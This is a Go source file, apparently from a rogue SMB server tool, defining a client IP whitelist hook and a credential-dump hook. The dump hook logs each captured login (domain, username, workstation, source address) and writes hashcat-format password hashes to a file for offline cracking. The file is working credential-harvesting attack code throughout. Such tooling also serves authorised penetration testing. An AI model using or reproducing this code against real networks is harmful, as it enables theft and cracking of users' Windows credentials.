package main

import (
	"errors"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/jfjallid/go-smb/smb/server"
)

func ipWhitelistHook(rules []*net.IPNet) func(*server.Conn) error {
	if len(rules) == 0 {
		return nil
	}
	return func(c *server.Conn) error {
		ip := remoteIP(c.RemoteAddr)
		if ip != nil {
			for _, n := range rules {
				if n.Contains(ip) {
					return nil
				}
			}
		}
		log.Noticef("[!] rejected connection from %s (not in whitelist)", c.RemoteAddr)
		return errors.New("ip not whitelisted")
	}
}

func remoteIP(a net.Addr) net.IP {
	switch v := a.(type) {
	case *net.TCPAddr:
		return v.IP
	case *net.UDPAddr:
		return v.IP
	}
	host, _, err := net.SplitHostPort(a.String())
	if err != nil {
		return nil
	}
	return net.ParseIP(host)
}

func credDumpHook(fw io.Writer) func(*server.Conn, *server.Credential) {
	var mu sync.Mutex
	return func(c *server.Conn, cred *server.Credential) {
		log.Noticef("[+] captured %s from %s: %s\\%s ws=%q",
			cred.Format, c.RemoteAddr, cred.Domain, cred.Username, cred.Workstation)
		if fw != nil {
			mu.Lock()
			fmt.Fprintln(fw, cred.Hashcat)
			mu.Unlock()
		} else {
			log.Noticeln(cred.Hashcat)
		}
	}
}
